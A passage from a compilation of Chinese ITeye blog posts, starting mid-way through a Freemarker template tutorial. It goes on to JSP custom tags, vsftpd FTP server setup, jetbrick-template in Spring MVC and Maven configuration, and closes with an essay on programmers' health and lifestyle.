as names>          ${names}       </#list>   name是list循环的时候取的一个循环变量，freemarker在解析list标签的时候，等价于： [java] view plaincopyprint?     for (String names : nameList) {          System.out.println(names);      }   2、if：    该标签主要是做if判断用的，比如： [html] view plaincopyprint?     <#if (names=="陈靖仇")>       他的武器是: 十五~~      </#if>   这个是条件判断标签，要注意的是条件等式必须用括号括起来， 等价于： [java] view plaincopyprint?     if(names.equals("陈靖仇")){          System.out.println("他的武器是: 十五~~");      }    3、include：该标签用于导入文件用的。 [html] view plaincopyprint?     <#include "include.html"/>   这个导入标签非常好用，特别是页面的重用。 另外在静态文件中可以使用${} 获取值，取值方式和el表达式一样，非常方便。 下面举个例子（static.html）： [html] view plaincopyprint?     <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">      <html>      <head>      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">      <title>Insert title here</title>      </head>      <body>            描述：${description}      <br/>      集合大小:${nameList?size}      <br/>      迭代list集合：      <br/>      <#list nameList as names>      这是第${names_index+1}个人，叫做：<label style="color:red">${names}</label>      if判断：      <br/>      <#if (names=="陈靖仇")>       他的武器是: 十五~~      <#elseif (names=="宇文拓")>       <#--注意这里没有返回而是在最后面-->        他的武器是: 轩辕剑~·      <#else>      她的绝招是：蛊毒~~      </#if>      <br/>      </#list>      迭代map集合：      <br/>      <#list weaponMap?keys as key>      key--->${key}<br/>      value----->${weaponMap[key]!("null")}      <#--       fremarker 不支持null, 可以用！ 来代替为空的值。      其实也可以给一个默认值        value-----${weaponMap[key]?default("null")}      还可以 在输出前判断是否为null      <#if weaponMap[key]??></#if>都可以      -->            <br/>      </#list>      include导入文件：      <br/>      <#include "include.html"/>            </body>      </html>   实际代码： [java] view plaincopyprint?     package com.chenghui.test;            import java.io.File;      import java.io.FileOutputStream;      import java.io.IOException;      import java.io.OutputStreamWriter;      import java.io.Writer;      import java.util.ArrayList;      import java.util.HashMap;      import java.util.List;      import java.util.Map;            import freemarker.template.Configuration;      import freemarker.template.DefaultObjectWrapper;      import freemarker.template.Template;      import freemarker.template.TemplateException;            public class CreateHtml {          public static void main(String[] args) {              try {                  //创建一个合适的Configration对象                  Configuration configuration = new Configuration();                  configuration.setDirectoryForTemplateLoading(new File("D:\\project\\webProject\\WebContent\\WEB-INF\\template"));                  configuration.setObjectWrapper(new DefaultObjectWrapper());                  configuration.setDefaultEncoding("UTF-8");   //这个一定要设置，不然在生成的页面中 会乱码                  //获取或创建一个模版。                  Template template = configuration.getTemplate("static.html");                  Map<String, Object> paramMap = new HashMap<String, Object>();                  paramMap.put("description", "我正在学习使用Freemarker生成静态文件！");                                    List<String> nameList = new ArrayList<String>();                  nameList.add("陈靖仇");                  nameList.add("玉儿");                  nameList.add("宇文拓");                  paramMap.put("nameList", nameList);                                    Map<String, Object> weaponMap = new HashMap<String, Object>();                  weaponMap.put("first", "轩辕剑");                  weaponMap.put("second", "崆峒印");                  weaponMap.put("third", "女娲石");                  weaponMap.put("fourth", "神农鼎");                  weaponMap.put("fifth", "伏羲琴");                  weaponMap.put("sixth", "昆仑镜");                  weaponMap.put("seventh", null);                  paramMap.put("weaponMap", weaponMap);                                    Writer writer  = new OutputStreamWriter(new FileOutputStream("success.html"),"UTF-8");                  template.process(paramMap, writer);                                    System.out.println("恭喜，生成成功~~");              } catch (IOException e) {                  e.printStackTrace();              } catch (TemplateException e) {                  e.printStackTrace();              }                        }      }   附：freemarker教程     这样子基本上可以算的上可以简单的去做一点简单的生成了，但是要在实际中去运用，还是差的很远的，因为freemarker给的标签完全满足不了我们的需要，这时候就需要自定义标签来完成我们的需求了。。五、Freemarker自定义标签 Freemarker自定义标签就是自己写标签，然后自己解析，完全由自己来控制标签的输入输出，极大的为程序员提供了很大的发挥空间。 基于步骤：        以前写标签需要在<后加# ，但是freemarker要识别自定义标签需要在后面加上@，然后后面可以定义一些参数，当程序执行template.process(paramMap, out);,就会去解析整个页面的所有的freemarker标签。      自定义标签 需要自定义一个类，然后实现TemplateDirectiveModel，重写execute方法，完成获取参数，根据参数do something等等。。     将自定义标签与解析类绑定在一起需要在paramMap中放入该解析类的实例，存放的key与自定义标签一致即可。。     注意：在自定义标签中，如果标签内什么也没有，开始标签和结束标签绝对不能再同一行，不然会报错 freemarker.log.JDK14LoggerFactory$JDK14Logger error   我曾经上当过，这是freemarker 存在的bug。 下面是static.html的例子： [html] view plaincopyprint?     <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">      <html>      <head>      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">      <title>Insert title here</title>      </head>      <body>      <#--自定义变量-->      <#assign num='hehe'/>      ${num}      <br/>      自定义标签        <@content name="chenghui" age="120">          ${output}          ${append}        </@content>              </body>      </html>    下面是上面的static.html模板的解析类： [java] view plaincopyprint?     package com.chenghui.test;            import static freemarker.template.ObjectWrapper.DEFAULT_WRAPPER;            import java.io.IOException;      import java.io.Writer;      import java.util.Map;                  import freemarker.core.Environment;      import freemarker.template.TemplateDirectiveBody;      import freemarker.template.TemplateDirectiveModel;      import freemarker.template.TemplateException;      import freemarker.template.TemplateModel;      import freemarker.template.TemplateModelException;      import freemarker.template.TemplateNumberModel;      import freemarker.template.TemplateScalarModel;            /**      * 自定义标签解析类      * @author Administrator      *      */      public class ContentDirective implements TemplateDirectiveModel{                private static final String PARAM_NAME = "name";          private static final String PARAM_AGE = "age";                    @Override          public void execute(Environment env, Map params,TemplateModel[] loopVars,                  TemplateDirectiveBody body) throws TemplateException, IOException {              if(body==null){                  throw new TemplateModelException("null body");              }else{                  String name = getString(PARAM_NAME, params);                  Integer age = getInt(PARAM_AGE, params);                  //接收到参数之后可以根据做具体的操作，然后将数据再在页面中显示出来。                  if(name!=null){                      env.setVariable("output", DEFAULT_WRAPPER.wrap("从ContentDirective解析类中获得的参数是："+name+", "));                  }                  if(age!=null){                      env.setVariable("append", DEFAULT_WRAPPER.wrap("年龄："+age));                  }                  Writer out = env.getOut();                  out.write("从这里输出可以再页面看到具体的内容，就像document.writer写入操作一样。<br/>");                  body.render(out);                                    /*                 如果细心的话，会发现页面上是显示out.write（）输出的语句，然后再输出output的内容，                 可见 在body在解析的时候会先把参数放入env中，在页面遇到对应的而来表单时的才会去取值                 但是，如果该表单时不存在，就会报错，  我觉得这里freemarker没有做好，解析的时候更加会把错误暴露在页面上。                 可以这样子弥补${output!"null"},始终感觉没有el表达式那样好。                 */              }          }                    /**          * 获取String类型的参数的值          * @param paramName          * @param paramMap          * @return          * @throws TemplateModelException          */          public static String getString(String paramName, Map<String, TemplateModel> paramMap) throws TemplateModelException{              TemplateModel model = paramMap.get(paramName);              if(model == null){                  return null;              }              if(model instanceof TemplateScalarModel){                  return ((TemplateScalarModel)model).getAsString();              }else if (model instanceof TemplateNumberModel) {                  return ((TemplateNumberModel)model).getAsNumber().toString();              }else{                  throw new TemplateModelException(paramName);              }          }                    /**          *           * 获得int类型的参数          * @param paramName          * @param paramMap          * @return          * @throws TemplateModelException           */          public static Integer getInt(String paramName, Map<String, TemplateModel> paramMap) throws TemplateModelException{              TemplateModel model = paramMap.get(paramName);              if(model==null){                  return null;              }              if(model instanceof TemplateScalarModel){                  String str = ((TemplateScalarModel)model).getAsString();                  try {                      return Integer.valueOf(str);                  } catch (NumberFormatException e) {                      throw new TemplateModelException(paramName);                  }              }else if(model instanceof TemplateNumberModel){                  return ((TemplateNumberModel)model).getAsNumber().intValue();              }else{                  throw new TemplateModelException(paramName);              }          }      }   然后再前面的实际代码中加上：[java] view plaincopyprint?     //自定义标签解析      paramMap.put("content", new ContentDirective());   这样子基本上可以使用，freemarker完成自定义标签了，解决一写简单的业务逻辑， 但是在实际的项目中不可能这样子去做，因为还没有和spring进行集成使用，每次都需要在解析的时候把解析类的实例放进去。。
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
JSP自定义标签的创建和使用, lcf19890121.iteye.com.blog.2048188, Fri, 18 Apr 2014 10:45:21 +0800
摘自http://jzinfo.iteye.com/blog/507387http://wing123.iteye.com/blog/356585参照http://my.oschina.net/aps/blog/107922第一种方法：创建的标签类，必须实现javax.servlet.jsp.tag接口. 下面是编写的一个简单的使用标签类的例子,该标签用来输出一行文字信息: Tag类：userTagLib Java代码      /*      * 标签处理类UserTagLibrary直接实现接口javax.servlet.jsp.tagext.tag接口      * 已经全部实现了Tag接口中的6个方法      * **/      package com.longweir.taglib;            import javax.servlet.jsp.PageContext;      import javax.servlet.jsp.tagext.*;      import javax.servlet.http.*;      import java.io.*;            //实现接口Tag中的6个方法来编写Tag处理类            public class userTagLib implements javax.servlet.jsp.tagext.Tag       {          private PageContext pagecontext;          private Tag Parent;                              public void setPageContext(PageContext pagecontext)          {              this.pagecontext=pagecontext;                        }                    public void setParent(Tag parent)          {              this.Parent=parent;          }                    public Tag getParent()          {              return Parent;          }                       //开始标签处理          public int doStartTag()          {              return SKIP_BODY;  //此处是空标签体，所以直接跳过          }                    //结束标签体处理          public int doEndTag()          {              try              {                  pagecontext.getOut().print("Hello,欢迎使用JSP标签对象");              }              catch (Exception e)              {}                    return EVAL_PAGE; //继续执行后续JSP页面代码          }                    //空实现release方法          public void release()          {              //空实现          }            }     编写tld标签库文件userTagLib.tld，用来映射处理的标签所对应的标签类：  Xml代码  收藏代码     <?xml version="1.0" encoding="UTF-8" ?>      <!DOCTYPE taglib              PUBLIC "-//Sun Microsystems, Inc.//DTD JSP Tag Library 1.2//EN"              "http://java.sun.com/dtd/web-jsptaglibrary_1_2.dtd">      <taglib>        <tlib-version>1.1</tlib-version>        <jsp-version>2.1</jsp-version>        <short-name>userTagLib</short-name>        <uri>/MyuserTagLib</uri>                <tag>            <name>Hello</name>            <tag-class>com.longweir.taglib.userTagLib</tag-class>            <body-content>empyt</body-content>          </tag>            </taglib>     在web.xml文件中，配置标签库的信息  Xml代码  收藏代码      <jsp-config>          <taglib>          <taglib-uri>/userTagLib</taglib-uri>          <taglib-location>/WEB-INF/tlds/userTagLib.tld</taglib-location>      </taglib>       </jsp-config>       编写一个简单的hello01.jsp文件来显示标签内容：Java代码  收藏代码     <%@ page contentType="text/html;charset=GBK"%>      <%@ taglib uri="/userTagLib" prefix="myTag" %>            <html>        <head>            <title>HelloApp</title>              <meta http-equiv="pragma" content="no-cache">          <meta http-equiv="cache-control" content="no-cache">          <meta http-equiv="expires" content="0">         </head>          <body>          <b>Nice to meet you:${param.username}</b> <br>                    <p>显示标签库中的信息</p>          <h1><myTag:Hello/></h1>        </body>      </html>     提交页面：http://localhost:8085/hello/hello01.jsp?username=luoxianqiao   （username是提交的request参数） 显示结果为：      Nice to meet you:luoxianqiao             显示标签库中的信息            Hello,欢迎使用JSP标签对象       一般编写标签类直接继承自TagSupport即可，该类实现了接口IetreationTag接口，直接继承类实现的代码更简单，如下：     package com.longweir.taglib;            import javax.servlet.http.*;      import javax.servlet.jsp.tagext.*;      import java.io.*;      import javax.servlet.jsp.PageContext;      import javax.servlet.jsp.JspWriter;            public class userTagLib2 extends javax.servlet.jsp.tagext.TagSupport       {                         //结束标签体处理           public int doEndTag()          {              /*             String paramvalue=null;             paramvalue=pageContext.getRequest().getParameter(name);  //pageContext已在TagSupport中定义              JspWriter out=pageContext.getOut();                  try             {                 if (paramvalue!=null)                      out.print(paramvalue);                 else                     out.print("参数未能获取");             }             catch (Exception e)             {                 e.printStackTrace();             }                          */              JspWriter out=pageContext.getOut();              try              {                  out.print("成功显示了标签内容");              }              catch (Exception e)              {                  e.printStackTrace();              }                     return EVAL_PAGE; //继续执行后续JSP页面代码          }               } 第二种方法:jstl标签库的配置 * 将jstl.jar和standard.jar拷贝到WEB-INF/lib下（如果使用el表达式，不用拷贝这两个jar）  注意：jstl必须在能够支持j2ee1.4/servlet2.4/jsp2.0版本上的容器才能运行，这个环境      是目前较为常用的环境     标签库的使用 * 采用taglib指令引入 <%@ taglib prefix="c"  uri="http://java.sun.com/jsp/jstl/core"%>  <%@ taglib prefix="fmt" uri="http://java.sun.com/jsp/jstl/fmt"%>   自定义函数库： 1、定义类和方法（方法必须是public static）  2、编写自定义tld文件，并且将此文件放到WEB-INF或WEB-INF任意子目录下 3、在jsp中采用taglib指令引入自定义函数库 4、采用 前缀+冒号（:）+函数名 调用即可  MyFunctions.java  Myfunctions.java代码  public class MyFunctions {         public static String sayHello(String name) {        return "Hello " + name;     }     }      myfunctions.tld自定义标签 Xml代码  <?xml version="1.0" encoding="UTF-8" ?>    <taglib xmlns="http://java.sun.com/xml/ns/j2ee"    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"    xsi:schemaLocation="http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd"    version="2.0">         <description>my functions library</description>    <display-name>my functions</display-name>    <tlib-version>1.0</tlib-version>    <short-name>my</short-name>    <uri>http://www.bjsxt.com/functions</uri>       <function>      <name>sayHello</name>      <function-class>com.bjsxt.struts.MyFunctions</function-class>      <function-signature>java.lang.String sayHello(java.lang.String)</function-signature>    </function>     </taglib>     jstl_fn.jsp 注意与前面的配置文件myfunctions.tld相对应，prefix对应<short-name>my</short-name>uri对应 <uri>http://www.bjsxt.com/functions</uri>可使用以下面两种方式给name赋值：1、${my:sayHello("David") }2、request.setAttribute("name", "David"); Java代码  <%@ page language="java" import="java.util.*" pageEncoding="GB18030"%>  <%@ taglib uri="http://www.bjsxt.com/functions" prefix="my" %>    <%  request.setAttribute("name", "David");  %>    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">  <html>    <head>      <title>testTemplate</title>    </head>    <body>      ${my:sayHello(name) }    </body>  </html>     补充：web-app version="2.4"有时也需要在web.xml中添加对标签的定义： Xml代码  <jsp-config>      <taglib>          <taglib-uri>www.bjsxt.com/functions</taglib-uri>          <taglib-location>/WEB-INF/my.tld</taglib-location>      </taglib>  </jsp-config>    注意：  可能出现的异常1、The function xxx must be used with a prefix when a default namespace is not specified--- 在jsp页面中调用方式不正确，可能将 ":" 写成了 "." 2、The function xxx cannot be located with the specified prefix--- a) 类中定义的方法不是 public static 的方法      b) 类中的方法名称和jsp自带的标签元素冲突，重名等
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
FTP服务器搭建, lcf19890121.iteye.com.blog.2047235, Wed, 16 Apr 2014 10:34:07 +0800
   众所周知，FTP服务器用来上传和下载文件，采用FTP协议。     首先我们来安装FTP 1.$ yum install vsftpd(vsftpd是众多FTP软件中较为安全的一个)。 2.修改配置文件vsftpd.conf，路径为/etc/vsftpd/vsftpd.conf   如果是ubuntu系统的话，路径为   /etc/vsftpd.conf  以下我针对两种身份进行ftp设定   第一种：针对实体账号设定  1.vi /etc/vsftpd/vsftpd.conf 2.修改配置，最后配置信息如下    anonymous_enable=NO  //匿名用户登录  local_enable=YES    //实体用户登录  write_enable=YES    //是否可以上传文件  local_umask=002      //建立目录（755）和文件（644）权限  userlist_enable=YES  //自定义阻挡实体用户访问   userlist_deny=YES    //与userlist_enable一起用，起阻拦用户登录用  userlist_file=/etc/vsftpd/uesr_list  //该文件默认不存在，需手动建立,内容可复制/etc/vsftpd/ftpusers文件，效果类似  //与服务器相关设置  use_localtime=YES   //这个尽量选YES，否则系统用格林威治时间  dirmessage_enable=YES   //若目录下有.message会显示该内容  xferlog_enable=YES     //启动日志记录，记录于/var/log/xferlog  connect_from_port_20=YES //从20端口进行连接，支持主动连接  xfelog_std_format=YES    //支持wuftp日志文件格式。  listen=YES                 //支持stand alone 方式启动  pam_service_name=vsftpd   //支持pam模块管理  tcp_wrappers=YES  //支持tcp wrappers防火墙机制  banner_file=/etc/vsftpd/welcome.txt  //用户登录提示，需手动建立   #添加针对某些实体用户来chroot的相关设置  chroot_local_user=YES  chroot_list_enable=YES  chroot_list_file=/etc/vsftpd/chroot_list    如果按以上配置需创建chroot_list文件：  $ vi /etc/vsftpd/chroot_list //建立不被chroot的用户帐号列表，即使没有帐号存在，该文件也要存在     3.重启ftp服务器  $ /etc/init.d/vsftpd restart  $ chkconfig vsftpd on   //设置开机启动   第二种，针对匿名用户登录  1.创建提供匿名用户下载上传文件的目录  $ mkdir /var/ftp/uploads  $ mkdir /var/ftp/downloads  #如果让用户可以上传下载文件   $ chown ftp /var/ftp/uploads   $ chown ftp /var/ftp/downloads   2.修改vsftpd.conf  $ vi /etc/vsftpd/vsftpd.conf        #与匿名用户相关信息    anonymous_enable=YES   no_anon_password=YES  //匿名登录时，是否校验密码    anon_max_rate=1000000  //最大带宽使用为1MB/s   data_connection_timeout=60 //数据流连接timeout为60秒    idle_connection_timeout=600 //匿名用户无操作10分钟后断线    max_clients=50  //最大连接数50   max_per_ip=5  //每个ip最多有5个连接      #让匿名用户可以自己上传下载文件    write_enable=YES     anon_other_write_enable=YES   anon_mkdir_write_enable=YES   anon_upload_enable=YES        #与实体用户相关信息     local_enable=NO   #与服务器相关信息    use_localtime=YES   dirmessage_enable=YES   xferlog_enable=YES   connect_from_port_20=YES   xferlog_std_format=YES   listen=YES   pam_service_name=vsftpd   tcp_wrappers=YES   banner_file=/etc/vsftdp/anon_welcome.txt  //需手动建立，提示文件      3.重启服务器   $ /etc/init.d/vsftpd restart   如果以上配置，登录时有报错 500 OOPS：cannot change directory:home/test/  修改SELinux防火墙如下   $ getsebool -a |grep ftp   $ setsebool -P ftp_home_dir=1
              
              
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
Java 模板引擎 jetbrick-template在springmvc中配置使用, lcf19890121.iteye.com.blog.2042972, Thu, 10 Apr 2014 14:08:10 +0800
jetbrick-template 是一个新一代 Java 模板引擎，具有高性能和高扩展性。 适合于动态 HTML 页面输出或者代码生成，可替代 JSP 页面或者 Velocity 等模板。 指令和 Velocity 相似，表达式和 Java 保持一致，易学易用。文章最后附简单springmvc集成jetbrick.template模版项目一个。1.配置web.xml<?xml version="1.0" encoding="UTF-8"?>   <web-app xmlns="http://java.sun.com/xml/ns/javaee"      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"      xsi:schemaLocation="http://java.sun.com/xml/ns/javaee      http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd"      version="3.0">             <!-- 加载jetbrick-template配置 -->    <context-param>      <param-name>jetbrick-template-config-location</param-name>      <param-value>/WEB-INF/jetbrick-template.properties</param-value>    </context-param>     <listener>       <listener-class>         jetbrick.template.web.JetWebEngineLoader       </listener-class>     </listener>    <!-- Spring MVC 核心控制器 -->    <servlet>        <servlet-name>mvc</servlet-name>        <servlet-class>          org.springframework.web.servlet.DispatcherServlet        </servlet-class>        <init-param>            <param-name>contextConfigLocation</param-name>            <param-value>classpath:spring-mvc.xml</param-value>        </init-param>        <load-on-startup>1</load-on-startup>    </servlet>    <servlet-mapping>        <servlet-name>mvc</servlet-name>        <url-pattern>/*</url-pattern>    </servlet-mapping>    <welcome-file-list>        <welcome-file>index.html</welcome-file>    </welcome-file-list> </web-app> 二、spring-mvc.xml配置<context:component-scan     base-package="jetbrick.template.samples.springmvc.controller"/>    <mvc:annotation-driven /><bean class="jetbrick.template.web.springmvc.JetTemplateViewResolver">     <property name="suffix" value=".jetx" />     <property name="contentType" value="text/html; charset=UTF-8" />     <property name="order" value="9999" /> </bean> 三、jetbrick-template.properties配置import.packages = jetbrick.template.samples.dao, jetbrick.template.samples.modelimport.autoscan = trueimport.autoscan.packages = jetbrick.template.samplestemplate.reloadable = truecompile.debug = trueinput.encoding=UTF-8output.encoding=UTF-8template.path=/WEB-INF/jetx/template.loader=jetbrick.template.resource.loader.FileSystemResourceLoadertemplate.suffix=.jetx 四、使用<!DOCTYPE html><html><head>    <meta charset='utf-8'>    <meta http-equiv="X-UA-Compatible" content="IE=edge">    <title>jetbrick-template samples</title></head><body>#define(UserInfo author)<div>Welcome, You are ${author.name}!</div><br/><table border="1" width="600">  <tr>    <td>ID</td>    <td>书名</td>    <td>作者</td>    <td>价格</td>    <td>出版时间</td>  </tr>  #for(BookInfo book: author.getBooks())  <tr>    <td>${book.id}</td>    <td>${book.name}</td>    <td>${book.getAuthorUser().name}</td>    <td>${book.price.format()}</td>    <td>${book.publicationDate.format("yyyy-MM-dd")}</td>  </tr>  #else  <tr>    <td colspan="5" height="100">Sorry! 还没出版过任何数据哦！</td>  </tr>  #end</table><br/>点击这里返回用户列表 </br/>#include("includes/footer.jetx")</body></html>
    本文附件下载:
    
      jetx-samples-springmvc.zip (7.9 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
maven环境配置以及myeclipse集成, lcf19890121.iteye.com.blog.2042956, Thu, 10 Apr 2014 13:44:45 +0800
一、maven环境的配置1准备安装jdk，本机使用的是1.6下载maven3.0.32，将maven解压到指定目录，本机解压后maven的根目录是：D:\Program Files\apache-maven-3.0.33，配置环境变量：新增环境变量：M2_HOME = D:\Program Files\apache-maven-3.0.3修改环境变量：path=%path%;% M2_HOME %\bin;    即，在path后加上% M2_HOME %\bin; 4，测试maven是否安装成功在命令行界面中输入Echo % M2_HOME %回车，结果如下： 输入 mvn –v，查看maven版本 5，启动myeclipse96，菜单项 window—>preferences—>myeclipse—>maven4myeclipse—>maven—>installations,点击右侧add按钮，选择本地maven的根目录，添加后，点击apply和ok按钮。7，菜单项 window—>preferences—>myeclipse—>maven4myeclipse—>maven—>user setting修改user settings 指定到本地maven的conf\setting.xml,点击update settings，apply 和ok。[/size] 二、项目里的pom.xml类似于以下：<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"       xsi:schemaLocation="http://maven.apache.org/POM/4.0.0         http://maven.apache.org/maven-v4_0_0.xsd">     <modelVersion>4.0.0</modelVersion>     <groupId>maventest</groupId>     <artifactId>maventest</artifactId>     <packaging>jar</packaging>     <version>0.0.1-SNAPSHOT</version>     <name>Maven Quick Start Archetype</name>     <url>http://maven.apache.org</url>     <dependencies>       <dependency>         <groupId>junit</groupId>         <artifactId>junit</artifactId>         <version>3.8.1</version>         <scope>test</scope>      </dependency>  </dependencies></project> 向项目中添加依赖jar包：        <dependency>           <groupId>org.apache.struts</groupId>           <artifactId>struts2-core</artifactId>           <version>2.0.11</version>       </dependency> 三、maven操作    在cmd中找到对应项目地址，然后敲如下命令：        1. mvn eclipse:clean  清除Project中以前的编译的东西，重新再来        2. mvn eclipse:eclipse  开始编译Maven的Project    在Myeclipse中的操作：         1. 选中Maven Project 右击 在Run As中选择Maven clean       2. 在Myeclipse中，Project—Clean  开始编译        3. 选中Maven Project 右击 在Run As中选择Maven install 四、maven仓库及仓库配置   1.找到maven安装路径下的conf文件夹，打开setting.xml,找到类似   <localRepository>D:\maven_repository</localRepository>   按如上修改仓库地址，一般刚安装的maven是在C:\Users\Administrator\.m2\repository这个路径下创建仓库。   2.配置内网仓库和外网仓库可能有的公司只能上内网，因此配置内网仓库非常有必要。 Maven搜索依赖的顺序就是：1）搜索本地仓库，没有找到，就去第2步，否则退出2）搜索内网仓库，没有找到，就去第3步，否则退出3）搜索远程仓库获取，没有找到，就报错<!--nexus repository install-->	<profile>       	<id>dev</id>	     <repositories>              <repository>                 <id>nexus</id>                 <url>http://people.apache.org/repo/m2-incubating-repository/</url>                 <releases>                    <enabled>true</enabled>                 </releases>                 <snapshots>                    <enabled>true</enabled>                 </snapshots>              </repository>	    </repositories>                        <pluginRepositories>                <pluginRepository>                    <id>nexus</id>		    <url>http://repository.sonatype.org/content/groups/public/</url>                    <releases>                        <enabled>true</enabled>                    </releases>                    <snapshots>                        <enabled>true</enabled>                   </snapshots>                </pluginRepository>            </pluginRepositories>	</profile></profiles>    五、maven外网仓库地址由于中央仓库有的时候不能访问，我们需要一定知道多个外网仓库以便下载依赖jar包下面列出几个maven仓库地址供大家使用。共有的仓库http://repo1.maven.org/maven2/http://repository.jboss.com/maven2/http://repository.sonatype.org/content/groups/public/http://mirrors.ibiblio.org/pub/mirrors/maven2/org/acegisecurity/ 私有的仓库http://repository.codehaus.org/http://snapshots.repository.codehaus.org/http://people.apache.org/repo/m2-snapshot-repositoryhttp://people.apache.org/repo/m2-incubating-repository/
              
  
    本文附件下载:
    
      apache-maven-3.0.3-bin.zip (2.9 MB)
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
程序员，做技术神马的，请对自己好一点, 909012142.iteye.com.blog.2064119, Thu, 08 May 2014 23:06:25 +0800

昨天在Google图片中输入“程序员”，搜索到的第一张图片是这样的：
 
一位平头兄桌上两台笔记本一台台式机。其中的一台中显示是某个论坛的页面【估计正在回答某个问题】、中间那台正在启动Eclipse【要开始写Java程序了】、平头兄的目光此时盯在台式机的显示器上【应该是正在远程或者是某个虚拟机】，旁边还有一本打开的书…
图片的名字是“真正的程序员就应该这样”，程序员就应该这样么？
是谁规定程序员就应该是这样的，本来是应该四个人做的事情让一个程序员做，难道程序员是四核的？
作为程序员中的一份子，我时刻注意对自己好一点。
 
 
穿着
下面两张图片是恶搞程序员的，虽然还没那么夸张，不过确实有那么点意思
现在的程序员跟不修边幅的艺术家很像，不同的是人家玩是艺术，我们写的是寂寞！
我们不用穿的很花哨，但是至少是得体！不要留给别人不好的印象，好像我们程序员现在就像民工一样【PS：不是诋毁民工同胞】
熟话说，“佛靠金装，人靠衣装”。我们程序员也需要稍微打扮下自己。
情感方面
微软曾经为Visual Studio 2010 做过一个煽情的广告，推出了以恋爱为主题的五个视频：
第一幕——《想做你的Code》：“爱上一个VC，做你下一行Code”。 第二幕——《让爱延长》：“幸福能run多久？有时候一分钟就够”，“更高效的C++，更多时间留给爱”。 第三幕——《幸福也要敏捷》：“约好的幸福，为什么总要一等再等？更多敏捷特性，更快响应爱的需要”。 第四幕——《为爱Debug》：“当爱有了Bug”我们的主人公能否成功Debug呢？” 第五幕——《让爱编译通过》：“不是每份爱都能编译通过，我想我就是那个幸运儿。”
 
这是一部分程序员的真实情况。但，绝大多是程序员一直单身。想旁边有个漂亮的女孩，想都别想。恐怖的说法是，鬼都不会找程序员！
年轻的程序员们，好好把握住自己身边的好女孩们，不要到后来发出这样的感慨“曾经有一份真挚的爱情摆在我面前，但是我没有珍惜，【因为我是程序员】。等到了失去的时候才后悔莫及，尘世间最痛苦的事莫过于此。如果老天可以再给我一个再来一次的机会，【我再也不做程序员了】”…
曾经在人人看到这样一条状态，出自我的一个也是程序员的同学“如果你的朋友很久没联系你了，有两种可能：一是死了，另一种是学通信或者电子或者计算 机… ”。我们要经常跟家人、朋友沟通，要时不时的打个电话给他们。还有我们的父母，我们要每隔一段时间打个电话给他们，免得他们牵挂！
程序员，记住，我们不是Machine，我们是Human，我们不只是需要跟Machine沟通，我们更需要跟Human的沟通！
饮食方面
泡面是程序员的主食之一，因为方便面很是方便，一盒面，一瓶开水就能填饱肚子。
众所周知，方便面是垃圾食品，方便面盐分过高，含防腐剂、香精，损肝；只有热量，没有营养 。长期食用对身体有害无益。但是，我们程序员却钟爱方便面，原因无他，吃饭吃耗时最短，又能边编程的食品。曾经有说法"最容易受伤的是男人的胃"，我想这男人中80%的是程序员。
程序员，请为你的家人想想吧， 吃些健康的食物吧。
生活起居方面
程序员大都是夜猫子，一般都是12点后才睡觉的.于是就有上面的这幅图片。
晚上十一点到早上一点，那是肝脏排毒的时间，我们程序员通常在这段时间还活跃着，写博客、看教程、看视频…此时的我们的大脑还处在兴奋状态，肝脏不能很好的排毒，带来的恶性结果是：我们的皮肤变得很差，身体抵抗力下降。
我们不一定要到很晚的时候才睡觉，有人说，我这个bug还没搞定呢，睡不着呢！我很欣赏这种一丝不苟的态度，却反对时常性的为了一个bug而搞到很晚！
别让我们的器官长期超负荷工作！ 请早点睡吧！
健康方面
今天看NBA的时候，主持人介绍了NBA的八大玻璃人。姚明和麦迪榜上有名，NBA最容易碎的玻璃人是开拓者的格雷格-奥登，这个赛季再次报销。NBA中受伤在所难免，那么激烈的身体对抗，磕磕碰碰也是正常事。但是，作为程序员的我们，又不跟谁打架，为什么那么脆弱？
由中华医院管理学会、中国医师协会、北京慈济健康体检连锁机构联合发布的“健康透支十大行业”社会调查结果显示，IT和企业高管人群中透支现象最为严重，亚健康比例分别为91%和86%；其次为媒体记者、证券、保险、出租车司机、交警、销售、律师、教师行业。
时常在园子里看到说一些不幸的消息，如某某癌症晚期….联想到前阵子有同事生病请病假，听项目经理感叹说道：程序员是很容意受伤的。确实是这样，长 期缺乏运动的我们，亚健康指数如同for循环的i，一直在做着++的运算…。“我们没有时间运动”，可能一些程序员抱怨道。我想引用鲁迅先生的原话，“时 间就像海棉里的水，只要肯挤总是有的”，只要你想运动，什么时候都可以。如，每天早上跑步去公交站台，中午吃饭饭了，出去溜达溜达….
社会中的地位
程序员的社会是低下的，在网上流传着这么一个说法“程序员被誉为IT农民工”。
 
劳力者下，劳智者中，劳人者上
我们大部分程序员现在做的是劳力活动，即第一类，我们其中的一部分可能需要正在向劳人者努力，有些人可能永远是劳力者…
我发现许多程序员动手时间和动脑时间之比都在9：1以上，优秀的程序员动手时间和动脑时间之比应该在7：3以下。当其比值下降到5：5、3：7以下程序员也就完成了向系统设计人员转变的准备。
给大家一点Tips：天时不如地利，地利不如人和！多想，谋而后动！ 
程序员，请对自己好一点！
 
已有 2 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
